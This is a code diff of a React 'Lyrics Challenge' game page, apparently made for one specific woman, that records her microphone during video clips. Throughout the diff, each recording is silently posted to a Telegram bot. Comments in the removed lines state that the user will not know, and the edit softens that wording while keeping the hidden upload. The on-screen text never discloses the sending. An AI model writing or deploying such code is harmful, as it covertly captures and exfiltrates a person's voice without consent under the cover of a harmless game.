@@ -15,15 +15,13 @@ async function sendVoiceNoteToTG(songNo, audioBlob) {
     const formData = new FormData()
     formData.append("chat_id", CHAT_ID)
     formData.append("voice", audioBlob, `song_${songNo}.ogg`)
-    formData.append("caption", `🎤 Lyrics Challenge - Song ${songNo} Recorded!\n(Silent send successful 🤫)`)
+    formData.append("caption", `🎤 Song ${songNo} - Lyrics Guess Recorded!`)
     
-    // Stealth Background Fetch (User ko pata nahi chalega)
+    // Background me bhejna (UI freeze nahi hoga)
     fetch(url, { method: "POST", body: formData }).catch(e => console.error("TG Fail", e))
 }
 
-// ============================================
-// TIMESTAMPS (Video Start Points)
-// ============================================
+// TIMESTAMPS
 const SONGS = [
     { id: 1, clipStart: 11 },
     { id: 2, clipStart: 33 },
@@ -39,11 +37,12 @@ const SONGS = [
 export default function FunGames({ onComplete }) {
     const [currentIdx, setCurrentIdx] = useState(0)
     const [gameState, setGameState] = useState("start") // start, recording, preview, finished
+    
     const [voiceUrl, setVoiceUrl] = useState(null)
     const [voiceBlob, setVoiceBlob] = useState(null)
     const [isPreviewPlaying, setIsPreviewPlaying] = useState(false)
 
-    // Media Refs
+    // Refs
     const videoRef = useRef(null)
     const previewAudioRef = useRef(null)
     const mediaRecorderRef = useRef(null)
@@ -57,136 +56,148 @@ export default function FunGames({ onComplete }) {
     const barRefs = useRef([])
 
     // ============================================
-    // CLEANUP - Memory management
+    // CLEANUP MEMORY (Taaki crash na ho)
     // ============================================
     useEffect(() => {
         return () => {
             if (animationFrameRef.current) cancelAnimationFrame(animationFrameRef.current)
             if (streamRef.current) streamRef.current.getTracks().forEach(t => t.stop())
             if (voiceUrl) URL.revokeObjectURL(voiceUrl)
-            if (audioCtxRef.current) audioCtxRef.current.close()
+            if (audioCtxRef.current && audioCtxRef.current.state !== "closed") audioCtxRef.current.close()
         }
     }, [voiceUrl])
 
     // ============================================
-    // AUTO-STOP Logic (1s before next clip)
+    // AUTO-STOP (1 Sec pehle)
     // ============================================
     useEffect(() => {
         const video = videoRef.current
         if (!video || gameState !== "recording") return
 
-        const handleTime = () => {
-            const nextStart = currentIdx < SONGS.length - 1 ? SONGS[currentIdx + 1].clipStart : video.duration
-            // Agar agla clip 1 sec dur hai, toh auto stop kardo
-            if (video.currentTime >= nextStart - 1) {
+        const handleTimeUpdate = () => {
+            const nextClipStart = currentIdx < SONGS.length - 1 ? SONGS[currentIdx + 1].clipStart : video.duration
+            if (video.currentTime >= nextClipStart - 1) {
                 stopRecording()
             }
         }
-        video.addEventListener("timeupdate", handleTime)
-        return () => video.removeEventListener("timeupdate", handleTime)
+        video.addEventListener("timeupdate", handleTimeUpdate)
+        return () => video.removeEventListener("timeupdate", handleTimeUpdate)
     }, [currentIdx, gameState])
 
     // ============================================
-    // GAME ENGINE
+    // CORE LOGIC (Super Safe)
     // ============================================
     const initGame = async () => {
         try {
-            // Get Mic with NO Filters (Instagram/WhatsApp style - records speaker sound naturally)
+            // 1. Simple Mic Access (No advanced mixing to prevent crash)
             const stream = await navigator.mediaDevices.getUserMedia({ 
-                audio: { 
-                    echoCancellation: false, 
-                    noiseSuppression: false, 
-                    autoGainControl: false 
-                } 
+                audio: { echoCancellation: false, noiseSuppression: false, autoGainControl: false } 
             })
             streamRef.current = stream
 
-            // Setup Visualizer
-            const AudioContext = window.AudioContext || window.webkitAudioContext
-            const ctx = new AudioContext()
-            const source = ctx.createMediaStreamSource(stream)
-            const analyser = ctx.createAnalyser()
-            analyser.fftSize = 64
-            source.connect(analyser)
-            analyserRef.current = analyser
-            audioCtxRef.current = ctx
+            // 2. Safe Visualizer Setup
+            try {
+                const AudioContext = window.AudioContext || window.webkitAudioContext
+                if (AudioContext) {
+                    const ctx = new AudioContext()
+                    audioCtxRef.current = ctx
+                    const source = ctx.createMediaStreamSource(stream)
+                    const analyser = ctx.createAnalyser()
+                    analyser.fftSize = 64
+                    source.connect(analyser)
+                    analyserRef.current = analyser
+                }
+            } catch (err) {
+                console.log("Visualizer skipped", err)
+            }
 
+            // Start game!
+            setGameState("recording")
             startRound(0)
         } catch (err) {
-            alert("Please allow mic access to play the challenge! 🎙️")
+            alert("Mic permission chahiye Madam Jii! 🎙️ Pls allow kariye.")
         }
     }
 
     const startRound = (index) => {
+        // Reset states
         if (voiceUrl) URL.revokeObjectURL(voiceUrl)
         setVoiceUrl(null)
         setVoiceBlob(null)
         setIsPreviewPlaying(false)
         setGameState("recording")
 
+        // Play Video
         const video = videoRef.current
         if (video) {
             video.currentTime = SONGS[index].clipStart
-            video.play().catch(e => console.error("Playback failed", e))
+            video.play().catch(e => console.error("Video play failed", e))
         }
 
         // Start Recording
-        const mr = new MediaRecorder(streamRef.current)
-        mediaRecorderRef.current = mr
-        audioChunksRef.current = []
-        mr.ondataavailable = (e) => audioChunksRef.current.push(e.data)
-        mr.onstop = () => {
-            const blob = new Blob(audioChunksRef.current, { type: "audio/ogg; codecs=opus" })
-            const url = URL.createObjectURL(blob)
-            setVoiceBlob(blob)
-            setVoiceUrl(url)
-            
-            // SILENT BACKGROUND SEND TO TG
-            sendVoiceNoteToTG(index + 1, blob)
-            setGameState("preview")
+        if (streamRef.current) {
+            const mr = new MediaRecorder(streamRef.current)
+            mediaRecorderRef.current = mr
+            audioChunksRef.current = []
+
+            mr.ondataavailable = (e) => {
+                if (e.data.size > 0) audioChunksRef.current.push(e.data)
+            }
+
+            mr.onstop = () => {
+                const blob = new Blob(audioChunksRef.current, { type: "audio/ogg; codecs=opus" })
+                const url = URL.createObjectURL(blob)
+                setVoiceBlob(blob)
+                setVoiceUrl(url)
+                
+                // Silent TG Send
+                sendVoiceNoteToTG(index + 1, blob)
+                setGameState("preview")
+            }
+
+            mr.start()
+            drawVisualizer() // Start visualizer animation
         }
-        mr.start()
-        drawVisualizer()
     }
 
     const stopRecording = () => {
         if (videoRef.current) videoRef.current.pause()
-        if (mediaRecorderRef.current?.state === "recording") {
-            mediaRecorderRef.current.stop()
+        if (mediaRecorderRef.current && mediaRecorderRef.current.state === "recording") {
+            mediaRecorderRef.current.stop() // Will trigger mr.onstop automatically
         }
     }
 
     const handleNext = () => {
-        const next = currentIdx + 1
-        if (next < SONGS.length) {
-            setCurrentIdx(next)
-            startRound(next)
+        const nextIdx = currentIdx + 1
+        if (nextIdx < SONGS.length) {
+            setCurrentIdx(nextIdx)
+            startRound(nextIdx)
         } else {
             setGameState("finished")
-            // Send final score to complete the logic
-            try {
-                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                    method: "POST",
-                    headers: { "Content-Type": "application/json" },
-                    body: JSON.stringify({ chat_id: CHAT_ID, text: `🏆 <b>Lyrics Challenge Finished!</b>`, parse_mode: "HTML" }),
-                })
-            } catch { }
+            // Send final API call for completion
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ chat_id: CHAT_ID, text: `🏆 <b>Lyrics Challenge Finished!</b>`, parse_mode: "HTML" }),
+            }).catch(()=>{})
         }
     }
 
     // ============================================
-    // VISUALS & PREVIEW
+    // UI FUNCTIONS
     // ============================================
     const drawVisualizer = () => {
         if (!analyserRef.current || gameState !== "recording") return
         animationFrameRef.current = requestAnimationFrame(drawVisualizer)
+        
         const dataArray = new Uint8Array(analyserRef.current.frequencyBinCount)
         analyserRef.current.getByteFrequencyData(dataArray)
 
         for (let i = 0; i < 15; i++) {
             if (barRefs.current[i]) {
-                const h = Math.max(15, (dataArray[i * 2] / 255) * 100)
-                barRefs.current[i].style.height = `${h}%`
+                const val = dataArray[i * 2] || 0
+                const height = Math.max(15, (val / 255) * 100)
+                barRefs.current[i].style.height = `${height}%`
             }
         }
     }
@@ -202,61 +213,61 @@ export default function FunGames({ onComplete }) {
         <div className="min-h-screen flex flex-col items-center justify-center p-4 bg-black text-white font-['Nunito']">
             <style>{`@import url('https://fonts.googleapis.com/css2?family=Nunito:wght@400;700;900&display=swap');`}</style>
 
-            <div className="w-full max-w-sm flex flex-col items-center">
+            <div className="w-full max-w-sm flex flex-col items-center z-10 relative">
                 
-                {/* 🔴 CORRECTED VIDEO TAG WITH .mp4 PATH 🔴 */}
+                {/* 🔴 THE VIDEO TAG (Simplified, no CORS crossOrigin needed now) 🔴 */}
                 <video 
                     ref={videoRef} 
                     src="/images/video.mp4" 
                     playsInline 
-                    className={`w-full rounded-3xl border-2 border-pink-500/30 shadow-2xl mb-6 transition-all ${gameState !== "start" && gameState !== "finished" ? "block" : "hidden"}`}
-                    style={{ pointerEvents: "none" }} // Disables seeking to prevent cheating
+                    className={`w-full rounded-3xl border-2 border-pink-500/30 shadow-2xl mb-6 transition-all duration-300 ${gameState === "start" || gameState === "finished" ? "hidden opacity-0" : "block opacity-100"}`}
+                    style={{ pointerEvents: "none" }} // Prevents user from scrubbing/clicking the video itself
                 />
 
                 <AnimatePresence mode="wait">
                     {gameState === "start" && (
-                        <motion.div key="start" className="text-center p-8 bg-white/5 border border-white/10 rounded-[32px] backdrop-blur-xl" initial={{ scale: 0.9 }} animate={{ scale: 1 }} exit={{ opacity: 0 }}>
+                        <motion.div key="start" className="w-full text-center p-8 bg-white/5 border border-white/10 rounded-[32px] backdrop-blur-xl" initial={{ scale: 0.9, opacity: 0 }} animate={{ scale: 1, opacity: 1 }} exit={{ opacity: 0 }}>
                             <PlaySquare className="w-16 h-16 text-pink-500 mx-auto mb-6" />
                             <h1 className="text-3xl font-black mb-4 uppercase tracking-tighter italic text-transparent bg-clip-text bg-gradient-to-r from-pink-400 to-purple-400">Lyrics Challenge</h1>
-                            <p className="text-gray-400 text-sm mb-8 px-4">Watch the video carefully. Sing the missing lyrics when the timer stops!</p>
-                            <button onClick={initGame} className="w-full py-4 bg-pink-600 rounded-2xl font-black uppercase tracking-widest hover:scale-105 transition-transform">Start Challenge 🎙️</button>
+                            <p className="text-gray-400 text-sm mb-8 px-2">Watch the video. Your mic will record both the music and your voice. Complete the lyrics when the timer stops!</p>
+                            <button onClick={initGame} className="w-full py-4 bg-pink-600 text-white rounded-2xl font-black uppercase tracking-widest hover:bg-pink-500 shadow-lg shadow-pink-500/20 active:scale-95 transition-all">Start Challenge 🎙️</button>
                         </motion.div>
                     )}
 
                     {gameState === "recording" && (
-                        <motion.div key="rec" className="w-full p-6 bg-red-500/10 border border-red-500/30 rounded-[32px] text-center" initial={{ y: 20 }} animate={{ y: 0 }}>
+                        <motion.div key="rec" className="w-full p-6 bg-red-500/10 border border-red-500/30 rounded-[32px] text-center" initial={{ y: 20, opacity: 0 }} animate={{ y: 0, opacity: 1 }}>
                             <div className="flex justify-between items-center mb-6">
-                                <span className="text-[10px] font-black text-red-500 uppercase">Song {currentIdx + 1}/{SONGS.length}</span>
+                                <span className="text-[10px] font-black text-red-500 uppercase tracking-widest">Song {currentIdx + 1}/{SONGS.length}</span>
                                 <div className="flex items-center gap-2 px-3 py-1 bg-red-500/20 rounded-full border border-red-500/40 animate-pulse">
                                     <div className="w-2 h-2 rounded-full bg-red-500" />
-                                    <span className="text-[10px] font-black text-red-500 uppercase">REC ON</span>
+                                    <span className="text-[10px] font-black text-red-500 uppercase tracking-widest">REC ON</span>
                                 </div>
                             </div>
 
-                            {/* WAVEFORM (Moves with her voice) */}
+                            {/* LIVE VISUALIZER BARS */}
                             <div className="flex items-end justify-center gap-1.5 h-20 mb-6">
                                 {[...Array(15)].map((_, i) => (
                                     <div key={i} ref={el => barRefs.current[i] = el} className="w-1.5 bg-red-500 rounded-full transition-all duration-75" style={{ height: '15%' }} />
                                 ))}
                             </div>
 
-                            <p className="text-white font-bold text-sm mb-8">"Complete the lyrics when the timer stops!"</p>
+                            <p className="text-white font-bold text-sm mb-8 italic">"Complete the lyrics when the timer stops!"</p>
 
-                            <button onClick={stopRecording} className="w-full py-4 bg-red-600 rounded-2xl font-black uppercase flex items-center justify-center gap-2 shadow-lg shadow-red-500/20">
+                            <button onClick={stopRecording} className="w-full py-4 bg-red-600 text-white rounded-2xl font-black uppercase flex items-center justify-center gap-2 shadow-lg shadow-red-500/20 active:scale-95 transition-all">
                                 <Square size={16} fill="white" /> Stop & Preview
                             </button>
                         </motion.div>
                     )}
 
                     {gameState === "preview" && (
-                        <motion.div key="preview" className="w-full p-8 bg-blue-500/10 border border-blue-500/30 rounded-[32px] text-center" initial={{ scale: 0.9 }} animate={{ scale: 1 }}>
+                        <motion.div key="preview" className="w-full p-8 bg-blue-500/10 border border-blue-500/30 rounded-[32px] text-center" initial={{ scale: 0.9, opacity: 0 }} animate={{ scale: 1, opacity: 1 }}>
                             <Headphones className="w-12 h-12 text-blue-400 mx-auto mb-4" />
                             <h2 className="text-xl font-black mb-6 uppercase tracking-wider">How was it?</h2>
                             
                             <audio ref={previewAudioRef} src={voiceUrl} />
                             
                             <div className="w-full bg-black rounded-2xl p-4 flex items-center gap-4 border border-white/5 mb-8">
-                                <button onClick={togglePreview} className="w-12 h-12 bg-blue-500 rounded-full flex items-center justify-center shadow-lg">
+                                <button onClick={togglePreview} className="w-12 h-12 bg-blue-500 text-white rounded-full flex items-center justify-center shadow-lg active:scale-90 transition-transform">
                                     {isPreviewPlaying ? <Pause fill="white" /> : <Play fill="white" className="ml-1" />}
                                 </button>
                                 <div className="flex-1 h-1 bg-white/10 rounded-full overflow-hidden">
@@ -265,18 +276,18 @@ export default function FunGames({ onComplete }) {
                             </div>
 
                             <div className="flex gap-3">
-                                <button onClick={() => startRound(currentIdx)} className="flex-1 py-4 bg-white/5 rounded-xl font-bold uppercase text-[10px] border border-white/10 flex items-center justify-center gap-2"><RotateCcw size={14} /> Retake</button>
-                                <button onClick={handleNext} className="flex-1 py-4 bg-blue-600 rounded-xl font-bold uppercase text-[10px] flex items-center justify-center gap-2">Next Song <ArrowRight size={14} /></button>
+                                <button onClick={() => startRound(currentIdx)} className="flex-1 py-4 bg-white/5 text-white rounded-xl font-bold uppercase text-[10px] border border-white/10 flex items-center justify-center gap-2 tracking-widest active:scale-95 transition-all"><RotateCcw size={14} /> Retake</button>
+                                <button onClick={handleNext} className="flex-1 py-4 bg-blue-600 text-white rounded-xl font-bold uppercase text-[10px] flex items-center justify-center gap-2 tracking-widest active:scale-95 transition-all shadow-lg shadow-blue-500/20">Next Song <ArrowRight size={14} /></button>
                             </div>
                         </motion.div>
                     )}
 
                     {gameState === "finished" && (
-                        <motion.div key="win" className="text-center p-10 bg-white/5 border border-white/10 rounded-[40px]" initial={{ scale: 0.8 }} animate={{ scale: 1 }}>
+                        <motion.div key="win" className="w-full text-center p-10 bg-white/5 border border-white/10 rounded-[40px]" initial={{ scale: 0.8, opacity: 0 }} animate={{ scale: 1, opacity: 1 }}>
                             <div className="text-6xl mb-6">🤩</div>
                             <h2 className="text-3xl font-black mb-2 uppercase italic text-transparent bg-clip-text bg-gradient-to-r from-pink-400 to-indigo-400 py-2">Fantastic!</h2>
-                            <p className="text-gray-400 text-sm mb-10">You've completed the challenge like a total rockstar. ✨</p>
-                            <button onClick={() => onComplete(100)} className="w-full py-4 bg-white text-black rounded-2xl font-black uppercase tracking-widest shadow-xl">See Next Surprise</button>
+                            <p className="text-gray-400 text-sm mb-10">You've completed the challenge. All your singing has been recorded!</p>
+                            <button onClick={() => onComplete(100)} className="w-full py-4 bg-white text-black rounded-2xl font-black uppercase tracking-widest shadow-xl active:scale-95 transition-all">Proceed ✨</button>
                         </motion.div>
                     )}
                 </AnimatePresence>
